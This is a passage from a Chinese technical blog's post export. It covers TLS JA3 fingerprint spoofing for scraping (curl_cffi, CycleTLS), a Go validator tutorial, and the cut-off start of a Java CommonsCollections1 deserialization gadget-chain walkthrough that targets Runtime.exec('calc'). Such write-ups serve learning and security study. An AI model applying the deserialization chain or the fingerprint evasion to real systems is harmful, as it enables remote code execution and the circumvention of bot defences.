urllib3<br><br>urllib3.util.ssl_.DEFAULT_CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join([<br>    <span class="hljs-comment"># &quot;ECDHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AES&quot;,</span><br>    <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>    <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!MD5&quot;</span>,<br>    <span class="hljs-string">&quot;!DSS&quot;</span>,<br>])<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>注意：Python层得TLS是基于底层openssl对外提供的方法，而openssl暴漏给Python只能通过修改 <code>ciphers</code> 来修改ja3指纹，无法支持修改 <code>SSLExtension, EllipticCurve, EllipticCurvePointFormat</code>。</p><h2 id="3-2-【PY】curl-cffi【案例1-2-3】"><a href="#3-2-【PY】curl-cffi【案例1-2-3】" class="headerlink" title="3.2 【PY】curl_cffi【案例1+2+3】"></a>3.2 【PY】curl_cffi【案例1+2+3】</h2><p><a href="https://pypi.org/project/curl-cffi/#description">https://pypi.org/project/curl-cffi/#description</a></p><ul><li>curl是一个可以发送网络请求的工具。</li><li>curl-impersonate是一个基于curl基础上进行开发的一个工具，可以完美的模拟主流的浏览器。</li><li>curl_cffi，是套壳curl-impersonate，让此工具可以更方便的应用在Python中。</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> curl-cffi<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> curl_cffi <span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    <span class="hljs-comment"># url=&quot;https://ascii2d.net/&quot;,</span><br>    <span class="hljs-comment"># url=&quot;https://cn.investing.com/equities/amazon-com-inc-historical-data&quot;,</span><br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;,<br>    impersonate=<span class="hljs-string">&quot;chrome101&quot;</span>,<br>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="3-3-【Go】CycleTLS-【案例1-2-3】"><a href="#3-3-【Go】CycleTLS-【案例1-2-3】" class="headerlink" title="3.3 【Go】CycleTLS 【案例1+2+3】"></a>3.3 【Go】CycleTLS 【案例1+2+3】</h2><p>关于Golang环境和基础入门教程可以参考：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">课件：https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">5</span>xclass.cn<span class="hljs-regexp">/wiki/</span>detail<span class="hljs-regexp">/4/</span><span class="hljs-number">0</span>/<br>视频：https:<span class="hljs-regexp">//</span>www.bilibili.com<span class="hljs-regexp">/video/</span>BV1u5411W79w/<br></code></pre></td></tr></table></figure><p>github上有一个基于Golang开发的开源模块CycleTLS ，可以更靠近底层去实现定制<code>ja3</code>指纹，直接自定义<code>ja3 fullstring</code>。</p><p><a href="https://github.com/Danny-Dasilva/CycleTLS">https://github.com/Danny-Dasilva/CycleTLS</a></p><p><img src="/./../blog_image/image-20231103184851991.png" alt="image-20231103184851991"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/Danny-Dasilva/CycleTLS/cycletls <br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/Danny-Dasilva/CycleTLS/cycletls&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>client := cycletls.Init()<br><br>    <span class="hljs-comment">// https://ascii2d.net/</span><br>    <span class="hljs-comment">// https://cn.investing.com/equities/amazon-com-inc-historical-data</span><br>    <span class="hljs-comment">// https://match.yuanrenxue.cn/api/match/19?page=1</span><br>response, err := client.Do(<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>, cycletls.Options&#123;<br>Body:      <span class="hljs-string">&quot;&quot;</span>,<br>Ja3:       <span class="hljs-string">&quot;771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0&quot;</span>,<br>UserAgent: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,<br>&#125;, <span class="hljs-string">&quot;GET&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Print(<span class="hljs-string">&quot;Request Failed: &quot;</span> + err.Error())<br>&#125;<br>log.Println(response)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
      <tag>golang开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>validator实现参数校验</title>
    <link href="/2023/12/02/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/"/>
    <url>/2023/12/02/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="一-导入包："><a href="#一-导入包：" class="headerlink" title="一.导入包："></a>一.导入包：</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> get github.com/<span class="hljs-keyword">go</span>-playground/validator/v10<br></code></pre></td></tr></table></figure><h1 id="二-基本语法："><a href="#二-基本语法：" class="headerlink" title="二.基本语法："></a>二.基本语法：</h1><table><thead><tr><th align="center">标记</th><th align="center">标记说明</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">required</td><td align="center">必填</td><td align="center">Field或Struct <code>validate:&quot;required&quot;</code></td></tr><tr><td align="center">omitempty</td><td align="center">空时忽略</td><td align="center">Field或Struct <code>validate:&quot;omitempty&quot;</code></td></tr><tr><td align="center">len</td><td align="center">长度</td><td align="center">Field <code>validate:&quot;len=0&quot;</code></td></tr><tr><td align="center">eq</td><td align="center">等于</td><td align="center">Field <code>validate:&quot;eq=0&quot;</code></td></tr><tr><td align="center">gt</td><td align="center">大于</td><td align="center">Field <code>validate:&quot;gt=0&quot;</code></td></tr><tr><td align="center">gte</td><td align="center">大于等于</td><td align="center">Field <code>validate:&quot;gte=0&quot;</code></td></tr><tr><td align="center">lt</td><td align="center">小于</td><td align="center">Field <code>validate:&quot;lt=0&quot;</code></td></tr><tr><td align="center">lte</td><td align="center">小于等于</td><td align="center">Field <code>validate:&quot;lte=0&quot;</code></td></tr><tr><td align="center">eqfield</td><td align="center">同一结构体字段相等</td><td align="center">Field <code>validate:&quot;eqfield=Field2&quot;</code></td></tr><tr><td align="center">nefield</td><td align="center">同一结构体字段不相等</td><td align="center">Field <code>validate:&quot;nefield=Field2&quot;</code></td></tr><tr><td align="center">gtfield</td><td align="center">大于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtfield=Field2&quot;</code></td></tr><tr><td align="center">gtefield</td><td align="center">大于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtefield=Field2&quot;</code></td></tr><tr><td align="center">ltfield</td><td align="center">小于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltfield=Field2&quot;</code></td></tr><tr><td align="center">ltefield</td><td align="center">小于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltefield=Field2&quot;</code></td></tr><tr><td align="center">eqcsfield</td><td align="center">跨不同结构体字段相等</td><td align="center">Struct1.Field <code>validate:&quot;eqcsfield=Struct2.Field2&quot;</code></td></tr><tr><td align="center">min</td><td align="center">最小值</td><td align="center">Field <code>validate:&quot;min=1&quot;</code></td></tr><tr><td align="center">max</td><td align="center">最大值</td><td align="center">Field <code>validate:&quot;max=2&quot;</code></td></tr><tr><td align="center">isdefault</td><td align="center">是默认值</td><td align="center">Field <code>validate:&quot;isdefault=0&quot;</code></td></tr><tr><td align="center">oneof</td><td align="center">其中之一</td><td align="center">Field <code>validate:&quot;oneof=5 7 9&quot;</code></td></tr><tr><td align="center">containsfield</td><td align="center">字段包含另一个字段</td><td align="center">Field <code>validate:&quot;containsfield=Field2&quot;</code></td></tr><tr><td align="center">email</td><td align="center">字符串值包含一个有效的电子邮件</td><td align="center">Field <code>validate:&quot;email&quot;</code></td></tr><tr><td align="center">json</td><td align="center">字符串值是否为有效的 JSON</td><td align="center">Field <code>validate:&quot;json&quot;</code></td></tr><tr><td align="center">file</td><td align="center">符串值是否包含有效的文件路径，以及该文件是否存在于计算机上</td><td align="center">Field <code>validate:&quot;file&quot;</code></td></tr><tr><td align="center">url</td><td align="center">符串值是否包含有效的 url</td><td align="center">Field <code>validate:&quot;url&quot;</code></td></tr><tr><td align="center">ip</td><td align="center">字符串值是否包含有效的 IP 地址</td><td align="center">Field <code>validate:&quot;ip&quot;</code></td></tr><tr><td align="center">ipv4</td><td align="center">字符串值是否包含有效的 ipv4地址</td><td align="center">Field <code>validate:&quot;ipv4&quot;</code></td></tr><tr><td align="center">datetime</td><td align="center">字符串值是否包含有效的 日期</td><td align="center">Field <code>validate:&quot;datetime&quot;</code></td></tr></tbody></table><h1 id="三-使用注意"><a href="#三-使用注意" class="headerlink" title="三.使用注意"></a>三.使用注意</h1><ol><li>当搜索条件与特殊标记冲突时,如：逗号（,），或操作（|），中横线（-）等则需要使用 UTF-8十六进制表示形式</li></ol><p>如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Test <span class="hljs-keyword">struct</span> &#123;<br>   Field1 <span class="hljs-type">string</span>  <span class="hljs-string">`validate:&quot;excludesall=|&quot;`</span>    <span class="hljs-comment">// 错误</span><br>   Field2 <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;excludesall=0x7C&quot;`</span> <span class="hljs-comment">// 正确.</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>可通过validationErrors :&#x3D; errs.(validator.ValidationErrors)获取错误对象自定义返回响应错误</p></li><li><p>自定义校验结果翻译</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 初始化翻译器</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateInit</span><span class="hljs-params">()</span></span> &#123;<br>zh_ch := zh.New()<br>uni := ut.New(zh_ch)               <span class="hljs-comment">// 万能翻译器，保存所有的语言环境和翻译数据</span><br>Trans, _ = uni.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>) <span class="hljs-comment">// 翻译器</span><br>Validate = validator.New()<br>_ = zh_translations.RegisterDefaultTranslations(Validate, Trans)<br><span class="hljs-comment">// 添加额外翻译</span><br>_ = Validate.RegisterTranslation(<span class="hljs-string">&quot;required_without&quot;</span>, Trans, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> ut.Add(<span class="hljs-string">&quot;required_without&quot;</span>, <span class="hljs-string">&quot;&#123;0&#125; 为必填字段!&quot;</span>, <span class="hljs-literal">true</span>)<br>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator, fe validator.FieldError)</span></span> <span class="hljs-type">string</span> &#123;<br>t, _ := ut.T(<span class="hljs-string">&quot;required_without&quot;</span>, fe.Field())<br><span class="hljs-keyword">return</span> t<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>如果需要校验多种，需要使用<code>,</code>进行分隔，如下：</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> UserLoginRequest <span class="hljs-keyword">struct</span> &#123;<br>    CaptchaCode <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;captcha_code&quot; validate:&quot;required,ValidateCaptchaCodeLength&quot;`</span><br>    UserName    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;user_name&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;用户名&quot;`</span><br>    Password    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;password&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;密码&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四-使用案例："><a href="#四-使用案例：" class="headerlink" title="四.使用案例："></a>四.使用案例：</h1><h2 id="4-1-实现国际化-中文："><a href="#4-1-实现国际化-中文：" class="headerlink" title="4.1 实现国际化&#x2F;中文："></a>4.1 实现国际化&#x2F;中文：</h2><p><code>translator := ut.New(zh.New())</code>可以实现中文翻译</p><p><code> trans, _ = translator.GetTranslator(&quot;zh&quot;)</code>这里有个坑，就是第二个参数是bool，不管是<code>en</code>还是<code>zh</code>都是会报错的，忽略可以正常运行。</p><p><code>RegisterTagNameFunc</code>就是获取我们自定义的字段的tag，后面就可以实现这个label的值加上报错信息了(label的值为中文)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitValidator</span><span class="hljs-params">()</span></span> (*validator.Validate, ut.Translator) &#123;<br>    validate = validator.New()<br>    translator := ut.New(zh.New())<br>    trans, _ = translator.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>)<br>    err := zhTrans.RegisterDefaultTranslations(validate, trans)<br>    <span class="hljs-comment">// 注册自定义方法 可以实现 label字段+错误信息</span><br>    validate.RegisterTagNameFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(fld reflect.StructField)</span></span> <span class="hljs-type">string</span> &#123;<br>       name := fld.Tag.Get(<span class="hljs-string">&quot;label&quot;</span>)<br>       <span class="hljs-keyword">return</span> name<br>    &#125;)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;registerDefaultTranslations fail: %s\n&quot;</span>, err.Error()))<br>    &#125;<br>    <span class="hljs-keyword">return</span> validate, trans<br>&#125;<br></code></pre></td></tr></table></figure><p>在gin中如何校验？</p><p>使用<code>validator.Struct</code>就可以对其进行校验了，如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := global.Validator.Struct(&amp;req); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, fieldError := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>response.FailWithMessage(fieldError.Translate(global.Translator), ctx)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>fieldError</code>我们可以获取当前报错的字段的信息如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-自定义校验方法："><a href="#4-2-自定义校验方法：" class="headerlink" title="4.2 自定义校验方法："></a>4.2 自定义校验方法：</h2><p>需要自定义校验方法，只需要使用<code>RegisterValidation</code>即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// RegisterValidation adds a validation with the given tag</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// NOTES:</span><br><span class="hljs-comment">// - if the key already exists, the previous validation function will be replaced.</span><br><span class="hljs-comment">// - this method is not thread-safe it is intended that these all be registered prior to any validation</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validate)</span></span> RegisterValidation(tag <span class="hljs-type">string</span>, fn Func, callValidationEvenIfNull ...<span class="hljs-type">bool</span>) <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-keyword">return</span> v.RegisterValidationCtx(tag, wrapFunc(fn), callValidationEvenIfNull...)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Func</code>是一个<code>type Func func(fl FieldLevel) bool</code></p><p>这里的方法，可以写指针接收者，也可以写直接收者都是无所谓的，返回值一定需要是布尔类型，</p><p>完整代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;github.com/go-playground/validator/v10&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>FirstName <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>LastName  <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>Age       <span class="hljs-type">uint8</span>  <span class="hljs-string">`validate:&quot;validateAge&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> ValidateAge(fl validator.FieldLevel) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 在自定义验证方法中获取字段的值</span><br><span class="hljs-keyword">return</span> fl.Field().Uint() &gt; <span class="hljs-number">4</span><br>&#125;<br><br><span class="hljs-keyword">var</span> validate *validator.Validate<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>validate = validator.New()<br>user := &amp;User&#123;<br>FirstName: <span class="hljs-string">&quot;Badger&quot;</span>,<br>LastName:  <span class="hljs-string">&quot;Smith&quot;</span>,<br>Age:       <span class="hljs-number">34</span>,<br>&#125;<br>validate.RegisterValidation(<span class="hljs-string">&quot;validateAge&quot;</span>, user.ValidateAge)<br>validateStruct(user)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateStruct</span><span class="hljs-params">(user *User)</span></span> &#123;<br><br>err := validate.Struct(user)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关键点在于：</p><ol><li>tag中定义我们需要的校验方法</li><li>使用<code>RegisterValidation(tag,function) bool</code>方法注册校验方法</li></ol>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链2</title>
    <link href="/2023/10/27/cc1%E8%B0%83%E7%94%A8%E9%93%BE2/"/>
    <url>/2023/10/27/cc1%E8%B0%83%E7%94%A8%E9%93%BE2/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链</title>
    <link href="/2023/10/26/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/"/>
    <url>/2023/10/26/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/</url>
    
    <content type="html"><![CDATA[<h1 id="1-配置环境："><a href="#1-配置环境：" class="headerlink" title="1. 配置环境："></a>1. 配置环境：</h1><p>cc1调用链需要环境如下:</p><ul><li>jdk1.8.0_65</li><li>commons-collections 版本号为<code>3.2.1</code></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">jdk1.8_65源码</a></li></ul><ol><li>下载<code>jdk 8u65</code> <a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">Oracle JDK 8u65 全平台安装包下载 - 码霸霸 (lupf.cn)</a></li><li>导入坐标如下</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>解压jdk1.8.0_65下是src文件，将jdk1.8.0_65源码中的<code>src/share/clasess/sun</code>添加到你配置的1.8.0_65中的<code>src</code>目录中。</li></ol><p>教程：</p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p><h1 id="2-思路："><a href="#2-思路：" class="headerlink" title="2. 思路："></a>2. 思路：</h1><p><img src="/./../blog_image/image-20231023230226781-1698124632828-1.png" alt="image-20231023230226781"></p><p>从调用危险方法到调用顶层<code>readObject</code>实现反序列化</p><h1 id="3-探索："><a href="#3-探索：" class="headerlink" title="3. 探索："></a>3. 探索：</h1><h2 id="3-1-简单找个危险函数："><a href="#3-1-简单找个危险函数：" class="headerlink" title="3.1 简单找个危险函数："></a>3.1 简单找个危险函数：</h2><h3 id="突破口-transform方法："><a href="#突破口-transform方法：" class="headerlink" title="- 突破口 transform方法："></a>- 突破口 transform方法：</h3><p>找到一个接口，查看他的实现类</p><p><img src="/./../blog_image/image-20231023230454765.png" alt="image-20231023230454765"></p><p>找到一个<code>InvokerTranformer</code>类的<code>transform</code>方法，接收参数是可控的，即获取了当前传入obejct类，然后调用反射去调用成员变量的函数名和函数参数，找到他的构造函数</p><p><img src="/./../blog_image/image-20231023230819092.png" alt="image-20231023230819092"></p><p>第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。我们通过构造函数然后去调用<code>transform</code>方法即可调用我们传入类的方法了。</p><p>我们任意调用的方法是这样的<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>这里使用<code>InvokerTransformer</code>就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 